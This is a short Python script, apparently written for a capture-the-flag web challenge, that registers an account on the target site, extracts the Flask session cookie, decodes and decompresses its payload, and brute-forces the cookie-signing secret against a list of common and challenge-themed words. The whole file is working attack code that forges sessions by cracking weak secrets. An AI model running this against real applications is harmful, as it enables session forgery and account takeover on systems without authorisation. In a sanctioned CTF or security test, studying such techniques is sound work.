import base64, zlib, json, requests
from itsdangerous import URLSafeTimedSerializer, URLSafeSerializer, Signer
from hashlib import sha1
import hmac

base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()
s.post(f'{base}/register', data={'username':'hacker600','password':'pass600'}, allow_redirects=False)
r = s.post(f'{base}/login', data={'username':'hacker600','password':'pass600'}, allow_redirects=False)
cookie = s.cookies.get('session')
print('Cookie:', cookie)
parts = cookie.split('.')
print('Parts:', [len(p) for p in parts])

# Get payload and try to crack with common words
payload_compressed = base64.urlsafe_b64decode(parts[1] + '='*(4-len(parts[1])%4))
print('Payload compressed:', payload_compressed)
session_data = zlib.decompress(payload_compressed)
print('Session data:', session_data)

# Common Flask secret keys
common_secrets = ['secret', 'tom', 'jerry', 'cheese', 'flask', 'password', 'admin', 'key', '123456', 'changeme', 'dev', 'production', 'CTF', 'flag', 'tomjerry', 'jerrytom', 'lucky', 'draw', 'grandmeal', 'cheeseshop', 'random']

for secret in common_secrets:
    s = URLSafeTimedSerializer(secret_key=secret, salt='cookie-session', signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha1})
    try:
        data = s.loads(cookie)
        print(f'Found secret: {secret}')
        print('Decoded:', data)
        break
    except Exception as e:
        pass
else:
    print('Not found in common secrets')
